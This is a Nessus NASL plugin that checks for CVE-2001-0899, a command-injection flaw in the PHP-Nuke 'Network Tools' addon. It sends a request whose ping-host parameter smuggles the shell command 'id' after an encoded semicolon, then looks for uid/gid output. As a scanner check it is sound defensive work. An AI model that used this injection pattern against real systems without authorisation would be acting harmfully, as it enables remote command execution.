#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Ref: http://www.isecurelabs.com/article.php?sid=209
#

 desc = "
It is possible to make the remote host execute arbitrary
commands through the use of the PHPNuke addon called 'Network Tools'.

An attacker may use this flaw to gain a shell on this system.

Solution : Upgrade to NetTools 0.3 or newer
Risk factor : High";


if(description)
{
 script_id(11106);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2001-0899");
 name["english"] = "NetTools command execution";

 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Executed 'id' through index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("php_nuke_installed.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
installed = get_kb_item("www/" + port + "/php-nuke");
if ( ! installed ) exit(0);
array = eregmatch(pattern:"(.*) under (.*)", string:installed);
if ( ! array ) exit(0);
dir = array[2];


http_check_remote_code (
			unique_dir:dir,
			check_request:"/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc,
                        port:port
			);
